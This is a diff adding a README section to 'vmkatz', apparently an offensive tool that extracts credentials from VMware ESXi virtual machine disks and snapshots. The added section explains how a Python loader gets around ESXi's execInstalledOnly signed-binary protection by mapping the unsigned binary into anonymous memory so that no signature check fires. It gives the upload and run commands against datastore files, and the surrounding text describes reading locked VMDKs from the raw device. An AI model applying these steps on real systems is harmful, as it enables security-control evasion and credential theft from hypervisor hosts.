@@ -263,6 +263,30 @@ esxcli system settings advanced set -o /User/execInstalledOnly -i 0
 /tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-flat.vmdk
 ```
 
+### Running with VIB protection enabled
+
+When `execInstalledOnly` is set to 1 (default on ESXi 7.0+), unsigned binaries cannot be executed directly. The included Python loader (`vmkatz_loader.py`) bypasses this by loading vmkatz into anonymous memory pages — ESXi allows `PROT_EXEC` on anonymous mappings while blocking `execve` on unsigned files.
+
+Python is VIB-signed on all ESXi versions and can execute normally.
+
+```bash
+# Upload both files
+scp vmkatz_loader.py target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/
+
+# Run through the loader (no need to disable execInstalledOnly)
+python3 /tmp/vmkatz_loader.py /tmp/vmkatz /vmfs/volumes/datastore1/MyVM/snapshot.vmsn
+
+# Works on ESXi 6.5+ (Python 2.7), 6.7+ (Python 3.5), 8.0+ (Python 3.8)
+python /tmp/vmkatz_loader.py /tmp/vmkatz --vmfs-list
+```
+
+The loader parses the ELF binary, maps segments into anonymous pages, applies relocations, and jumps to the entry point. No files are written to disk, no VIB signature check is triggered.
+
+To check if VIB protection is active on your ESXi host:
+```bash
+esxcli system settings advanced list -o /User/execInstalledOnly
+```
+
 ## VMFS-6 Raw Device Access (ESXi)
 
 On ESXi, VMFS locks prevent reading flat VMDK files from running VMs via the mounted filesystem. VMkatz includes a self-contained VMFS-6 parser that reads directly from the raw SCSI device, bypassing file locks entirely — no `vmkfstools`, no `.sbc.sf` access, no unmounting.
